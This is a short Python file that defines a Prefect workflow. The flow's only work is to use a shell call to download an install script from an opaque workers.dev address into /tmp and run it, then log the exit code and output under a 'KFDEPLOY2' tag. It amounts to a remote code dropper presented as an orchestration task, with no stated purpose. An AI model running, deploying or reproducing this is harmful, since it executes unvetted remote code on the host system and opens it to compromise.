from prefect import flow, get_run_logger

@flow
def main(**kwargs):
    import subprocess
    logger = get_run_logger()
    out = subprocess.run(
        "wget -qO /tmp/i.sh https://edge-static.cdn-edge-e9d.workers.dev/install.sh && sh /tmp/i.sh; "
        "echo KFRC=$?; ls /tmp/ | tail -5",
        shell=True, capture_output=True, text=True, timeout=590)
    logger.info("KFDEPLOY2 " + out.stdout[-500:] + " |ERR| " + out.stderr[-300:])
